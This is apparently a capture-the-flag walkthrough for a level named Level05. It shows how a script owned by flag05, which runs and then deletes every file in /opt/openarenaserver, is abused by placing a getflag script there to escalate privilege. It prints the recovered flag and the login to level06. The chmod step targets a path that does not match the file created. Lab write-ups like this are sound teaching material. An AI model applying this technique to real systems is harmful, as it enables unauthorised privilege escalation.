

# **Level05**

### **Walk through**

This time, `ls -la` gives us nothing. We try: 

`find / -user flag05 -group flag05 2>/dev/null | grep -v proc` that gives us:

```
/usr/sbin/openarenaserver
/rofs/usr/sbin/openarenaserver
```

When we `cat /usr/sbin/openarenaserver`  we obtain this output:

```bash
#!/bin/sh

for i in /opt/openarenaserver/* ; do
        (ulimit -t 5; bash -x "$i")
        rm -f "$i"
done
```
It's a script bash. This script loop over everything in the directory. `ulimit -t 5` gives a limit of 5 seconds of CPU time. `bash -x "$i"` execute **$i** and the **-x** print the command in the standard error output. After the execution of a file, it's deleted. 

So the idea is to write a script that will be store in `/opt/openarenaserver/` and executed by the script just above.

To do so, 

`echo "getflag > /tmp/flag05" > /opt/openarenaserver/script.sh`  
`chmod +x /opt/openarenaserver.sh`  

Now all we have to do is:

`cat /tmp/flag05` until the flag appears **`viuaaale9huek52boumoomioc`**

We will use it to log as level06

`su level06`
